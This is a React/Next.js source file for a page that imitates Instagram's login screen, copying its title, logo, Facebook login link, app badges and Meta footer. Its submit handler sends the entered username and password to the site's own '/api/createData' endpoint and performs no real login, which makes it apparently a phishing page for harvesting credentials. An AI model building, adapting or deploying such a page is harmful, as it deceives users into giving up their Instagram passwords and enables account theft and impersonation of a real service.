import Image from "next/image"
import Head from "next/head"
import { useState } from "react";

export default function Home() {
  const date = new Date();
  const [username, setUsername] = useState();
  const [pass, setPass] = useState();

  function handleChange(e) {
    if (e.target.id === "username") {
      setUsername(e.target.value);
    }
    else if (e.target.id === "pass") {
      setPass(e.target.value)
    }
  }
  async function handleSubmit(e) {
    e.preventDefault();

    const data = { username, pass };

    const req = await fetch("/api/createData", {
      method: "POST",
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })


  }
  return (
    <>
      <Head>
        <title>Login &bull; Instagram</title>
      </Head>
      <div className="h-auto overflow-y-auto overflow-x-hidden flex justify-center items-center bg-white flex-col ">
        <div className="flex flex-col justify-center items-center pc:border pc:border-gray-400 pc:p-8 pc:py-10 mb-8 pc:mb-4 pc:mt-8 shadow-sm shadow-gray-500">
          <Image className="mb-10 mt-10" src={"/instagram.png"} width={200} height={200} alt="insta-logo" ></Image>
          <form className="mb-5" onSubmit={handleSubmit} >
            <div className="inputs flex-col flex gap-y-2 mb-5">
              <input onChange={handleChange} id="username" className=" input rounded-sm bg-gray-100/50 border p-2 w-80 border-gray-300 focus:outline-gray-300" type="text" placeholder="Phone number, username or email" />
              <input onChange={handleChange} id="pass" className=" input rounded-sm bg-gray-100/50 border p-2 w-80 border-gray-300 focus:outline-gray-300" type="password" placeholder="Password" />
            </div>

            <div className="buttons ">
              <button className="font-bold text-center bg-blue-400 p-1 text-white w-80 rounded-lg hover:bg-blue-300" type="submit">Log in</button>
            </div>
          </form>

          <div className="or flex justify-center items-center gap-x-4 mb-8">
            {/* <span className="bg-gray-400 w-10 h-[0.175rem]"></span> */}
            <hr className=" bg-gray-400 w-32" />
            <span className="text-gray-400">OR</span>
            <hr className=" bg-gray-400 w-32" />

          </div>

          <div className="fb-login flex gap-x-2 justify-center items-center mb-6">
            <Image src={"/fb.png"} width={30} height={30} alt="fb-logo"></Image>
            <span className="font-bold text-blue-900 cursor-pointer hover:text-blue-800">Log in with Facebook</span>
          </div>

          <div className="forgot">
            <p className="text-blue-400 text-sm cursor-pointer hover:text-blue-300">Forgot password?</p>
          </div>
        </div>

        <div className="box-2 flex justify-center items-center mb-8 pc:border pc:border-gray-400 pc:p-4  pc:px-20 shadow-sm shadow-gray-500">
          <p>Don&apos;t have an account? <span className="text-blue-400 cursor-pointer hover:text-blue-300">Sign up</span></p>
        </div>

        <div className="get-the-app flex flex-col">
          <p className="mb-8 text-center">Get the app.</p>

          <div className="cards  p-5 flex gap-x-2 mb-10 justify-center ">
            <div className="p-1 w-40 rounded-md grid grid-cols-[50px,200px] grid-rows-1 bg-black cursor-pointer">
              <Image className="self-center justify-self-center" src={"/google.png"} width={25} height={25} alt="google-logo"></Image>
              <div className="flex flex-col text-white  ">
                <p className="text-xs ">Get It On</p>
                <p className="font-bold text-lg -translate-x-1 ">Google Play</p>
              </div>

            </div>
            <div className="p-1 w-40 rounded-md grid grid-cols-[50px,200px] grid-rows-1 bg-black cursor-pointer">
              <Image className="self-center justify-self-center" src={"/microsoft.png"} alt="mic-logo" width={35} height={35}></Image>
              <div className="flex flex-col text-white ">
                <p className="text-xs">Get it from</p>
                <p className="font-bold text-lg -translate-x-1">Microsoft</p>
              </div>

            </div>




          </div>
          <hr className="bg-gray-400 mb-5" />
          <div className="flex flex-wrap text-sm gap-x-4 justify-center items-center gap-y-3 text-gray-400  ">

            <p className="cursor-pointer hover:border-b hover:border-gray-400">Meta</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">About</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Blog</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Jobs</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Help</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">API</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Privacy</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Terms</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Locations</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Instagram Lite</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Threads</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Contact Uploading & Non-Users</p>
            <p className="cursor-pointer hover:border-b hover:border-gray-400">Meta Verified</p>
          </div>

          <div className="footer flex justify-center items-start pt-2 text-gray-400 h-24 gap-x-2 cursor-pointer">
            <select name="English" id="eng">
              <option value="English">English</option>
            </select>

            <span>&copy; {date.getFullYear()} Instagram from Meta </span>
          </div>
        </div>
      </div>
    </>
  )
}
